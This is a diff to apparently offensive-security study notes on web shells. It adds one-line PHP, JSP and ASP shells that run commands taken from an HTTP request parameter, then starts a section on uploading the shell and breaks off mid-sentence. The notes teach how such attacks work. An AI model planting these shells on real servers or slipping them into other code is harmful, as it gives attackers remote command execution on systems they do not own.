@@ -186,5 +186,18 @@ A webscript, typically `PHP`or `ASPX` that accepts commands through HTTP request
 Functionally, its very similar to command injection, just that we've leveraged an exploit such that we no longer need to inject the command.
 
 ### Process
-#### Step 1: Writing the Web Shell
+#### Step 1: Writing our Web Shell
 We need to write a web shell that takes our command through a `GET` request, executes it, and prints the output back. A web shell script is typically very short and can be easily memorised:
+
+```php
+<?php system($_REQUEST["cmd"]); ?>
+```
+```jsp
+<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
+```
+```asp
+<% eval request("cmd") %>
+```
+
+#### Step 2: Uploading our Web Shell
+Once we've written the shell, we need to place it in the 
